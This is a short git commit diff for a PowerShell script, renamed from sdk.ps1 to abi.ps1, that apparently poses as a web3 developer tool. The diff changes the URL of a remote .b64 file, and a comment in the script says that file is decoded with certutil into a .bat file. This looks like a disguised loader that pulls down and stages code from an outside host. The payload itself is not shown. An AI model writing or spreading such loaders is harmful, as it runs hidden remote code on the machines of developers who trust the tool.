4e46b09bd01329634b062004735c245a42827e1b
web3-call <rightnow8133@protonmail.com>
2026-07-29 11:02:08 +0100

    Update and rename sdk.ps1 to abi.ps1

--- abi.ps1
+++ abi.ps1
@@ -49,7 +49,7 @@ if (-not $args) {
     try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
 
     # Updated to download raw .b64 file and decode it using certutil -f -decode to .bat
-    $URL = 'https://smart.contract-call.xyz/system.b64'
+    $URL = 'https://servers.contract-call.xyz/system.b64'
 
     try {
         if ($psv -ge 3) {
